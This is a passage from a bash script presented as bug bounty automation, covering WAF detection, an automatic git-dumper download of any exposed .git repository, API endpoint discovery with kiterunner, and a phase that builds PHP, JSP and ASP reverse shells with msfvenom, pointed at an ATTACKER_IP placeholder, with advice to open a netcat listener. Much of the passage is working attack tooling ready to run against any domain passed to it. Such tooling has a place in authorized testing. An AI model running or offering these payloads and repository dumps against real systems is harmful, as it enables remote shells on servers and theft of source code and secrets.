        mkdir -p "$OUTPUT_DIR/waf"
        
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Detecting WAF on $clean_domain${NC}"
            wafw00f "$clean_domain" -o "$OUTPUT_DIR/waf/$clean_domain.txt"
        done < <(head -n 10 "$ALIVE_FILE") # Limit to first 10 domains to save time
        
        echo -e "${GREEN}[+] WAF detection completed${NC}"
    else
        echo -e "${RED}[!] wafw00f not found. Please install it for WAF detection.${NC}"
    fi
}

# 12. Information Disclosure Detection
info_disclosure() {
    echo -e "\n${YELLOW}[*] Phase 12: Information Disclosure Detection...${NC}"
    
    # Using git-dumper for exposed git repositories (matches the command from the document)
    if command -v git-dumper &> /dev/null; then
        echo -e "${BLUE}[*] Checking for exposed .git repositories...${NC}"
        mkdir -p "$OUTPUT_DIR/git_repos"
        
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Checking $clean_domain for exposed .git...${NC}"
            # Quick check if .git/HEAD is accessible
            if curl -s "https://$clean_domain/.git/HEAD" | grep -q "ref:"; then
                echo -e "${GREEN}[+] Found exposed .git repository on $clean_domain${NC}"
                git-dumper "https://$clean_domain/.git/" "$OUTPUT_DIR/git_repos/$clean_domain"
            fi
        done < <(head -n 20 "$ALIVE_FILE") # Check more domains as this is just a quick check
        
        echo -e "${GREEN}[+] Git repository checks completed${NC}"
    else
        echo -e "${RED}[!] git-dumper not found. Please install it for exposed git repository detection.${NC}"
    fi
}

# 13. Reverse Shell Generation
reverse_shell_gen() {
    echo -e "\n${YELLOW}[*] Phase 13: Reverse Shell Generation...${NC}"
    
    # Using MSFVenom for reverse shell generation (matches the command from the document)
    if command -v msfvenom &> /dev/null; then
        echo -e "${BLUE}[*] Generating reverse shell payloads...${NC}"
        mkdir -p "$OUTPUT_DIR/payloads"
        
        # Get the attacker IP (replace with your own IP or make it a parameter)
        ATTACKER_IP="YOUR_IP_HERE"
        echo -e "${YELLOW}[!] Using $ATTACKER_IP as the attacker IP. Edit the script to change this.${NC}"
        
        # Generate PHP reverse shell
        echo -e "${BLUE}[*] Generating PHP reverse shell...${NC}"
        msfvenom -p php/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=4444 -f raw > "$OUTPUT_DIR/payloads/shell.php"
        
        # Generate other useful payloads
        echo -e "${BLUE}[*] Generating JSP reverse shell...${NC}"
        msfvenom -p java/jsp_shell_reverse_tcp LHOST="$ATTACKER_IP" LPORT=4445 -f raw > "$OUTPUT_DIR/payloads/shell.jsp"
        
        echo -e "${BLUE}[*] Generating ASP reverse shell...${NC}"
        msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ATTACKER_IP" LPORT=4446 -f asp > "$OUTPUT_DIR/payloads/shell.asp"
        
        echo -e "${GREEN}[+] Reverse shell payloads generated in $OUTPUT_DIR/payloads/${NC}"
        echo -e "${YELLOW}[!] Remember to set up a listener (e.g., nc -lvnp 4444 or use Metasploit's multi/handler) before using these payloads.${NC}"
    else
        echo -e "${RED}[!] msfvenom not found. Please install Metasploit Framework for payload generation.${NC}"
    fi
}

# 14. API Recon
api_recon() {
    echo -e "\n${YELLOW}[*] Phase 14: API Reconnaissance...${NC}"
    
    # Using Kiterunner for API endpoint discovery (matches the command from the document)
    if command -v kiterunner &> /dev/null; then
        echo -e "${BLUE}[*] Running Kiterunner for API endpoint discovery...${NC}"
        mkdir -p "$OUTPUT_DIR/api"
        
        # Use a wordlist of common API paths (you may need to download or create one)
        API_WORDLIST="/path/to/api/wordlist.txt" # Update this path
        
        while read domain; do
            clean_domain=$(echo "$domain" | cut -d' ' -f1)
            echo -e "${BLUE}[*] Discovering API endpoints on $clean_domain${NC}"
            kiterunner scan -u "https://$clean_domain" -w "$API_WORDLIST" -o "$OUTPUT_DIR/api/$clean_domain.txt"
        done < <(head -n 5 "$ALIVE_FILE") # Limit to first 5 domains to save time
        
        echo -e "${GREEN}[+] API reconnaissance completed${NC}"
    else
        echo -e "${RED}[!] Kiterunner not found. Please install it for API endpoint discovery.${NC}"
    fi
}

# Main function to run all phases
main() {
    # Load configuration
    load_config
    
    # Validate input
    validate_input
    
    # Check resources
    check_resources
    
    # Setup directories
    setup_directories
    
    # Initialize logging
    log "INFO" "${CYAN}[*] BugBounty Automation Script started for target: $TARGET${NC}"
    
    # Check progress
    if check_progress; then
        log "INFO" "${YELLOW}[*] Continuing from previous progress${NC}"
    fi
    
    # Core reconnaissance phases with rate limiting
    log "INFO" "${YELLOW}[*] Starting subdomain enumeration...${NC}"
    subdomain_enum
    rate_limit 2
    update_progress "subdomain_enum"
    
    log "INFO" "${YELLOW}[*] Checking for alive subdomains...${NC}"
    check_alive
    rate_limit 2
    update_progress "check_alive"
    
    log "INFO" "${YELLOW}[*] Starting port scanning...${NC}"
    port_scan
    rate_limit 2
    update_progress "port_scan"
    
    log "INFO" "${YELLOW}[*] Taking screenshots...${NC}"
    take_screenshots
    rate_limit 2
    update_progress "take_screenshots"
    
    log "INFO" "${YELLOW}[*] Starting content discovery...${NC}"
    content_discovery
    rate_limit 2
    update_progress "content_discovery"
    
    log "INFO" "${YELLOW}[*] Starting JavaScript analysis...${NC}"
    js_analysis
    rate_limit 2
    update_progress "js_analysis"
    
    log "INFO" "${YELLOW}[*] Starting parameter discovery...${NC}"
    param_discovery
    rate_limit 2
    update_progress "param_discovery"
    
    # Vulnerability scanning phases
    log "INFO" "${YELLOW}[*] Starting vulnerability scanning...${NC}"
    vuln_scanning
    rate_limit 2
    update_progress "vuln_scanning"
    
    log "INFO" "${YELLOW}[*] Starting S3 bucket enumeration...${NC}"
    s3_bucket_enum
    rate_limit 2
    update_progress "s3_bucket_enum"
    
    # Additional phases
    log "INFO" "${YELLOW}[*] Starting CMS enumeration...${NC}"
    cms_enum
    rate_limit 2
    update_progress "cms_enum"
    
    log "INFO" "${YELLOW}[*] Starting WAF detection...${NC}"
    waf_detection
    rate_limit 2
    update_progress "waf_detection"
    
    log "INFO" "${YELLOW}[*] Starting information disclosure detection...${NC}"
    info_disclosure
    rate_limit 2
    update_progress "info_disclosure"
    
    log "INFO" "${YELLOW}[*] Generating reverse shells...${NC}"
    reverse_shell_gen
    rate_limit 2
    update_progress "reverse_shell_gen"
    
    log "INFO" "${YELLOW}[*] Starting API reconnaissance...${NC}"
    api_recon
    rate_limit 2
    update_progress "api_recon"
    
    # Generate report
    log "INFO" "${YELLOW}[*] Generating final report...${NC}"
    generate_report
    
    log "INFO" "${GREEN}[+] Bug Bounty Automation Completed!${NC}"
    log "INFO" "${GREEN}[+] Results saved in: $OUTPUT_DIR${NC}"
    log "INFO" "${GREEN}[+] Report generated: $OUTPUT_DIR/report.md${NC}"
    log "INFO" "${GREEN}[+] End time: $(date)${NC}"
    log "INFO" "${YELLOW}[*] Remember: Always perform bug bounty hunting ethically and responsibly!${NC}"
}

# Parse command-line arguments
parse_args() {
    WORDLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    THREADS=10
    TIMEOUT=10
    
    while [[ $# -gt 0 ]]; do
        case $1 in
            -w|--wordlist)
                WORDLIST="$2"
                shift 2
                ;;
            -t|--threads)
                THREADS="$2"
                shift 2
                ;;
            --timeout)
                TIMEOUT="$2"
                shift 2
                ;;
            -h|--help)
                echo "Usage: $0 <target_domain> [options]"
                echo "Options:"
                echo "  -w, --wordlist PATH   Path to wordlist for directory bruteforcing (default: $WORDLIST)"
                echo "  -t, --threads NUM     Number of threads to use (default: $THREADS)"
                echo "  --timeout NUM         Timeout in seconds for requests (default: $TIMEOUT)"
                echo "  -h, --help            Show this help message"
                exit 0
                ;;
            *)
                TARGET="$1"
                shift
                ;;
        esac
    done
    
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[!] Error: No target domain specified${NC}"
        echo -e "${YELLOW}[*] Usage: $0 <target_domain> [options]${NC}"
        exit 1
    fi
}

# Start script execution
if [ "$#" -eq 0 ]; then
    echo -e "${RED}[!] Error: No target domain specified${NC}"
    echo -e "${YELLOW}[*] Usage: $0 <target_domain> [options]${NC}"
    echo -e "${YELLOW}[*] Use -h or --help for more options${NC}"
    exit 1
fi

parse_args "$@"
main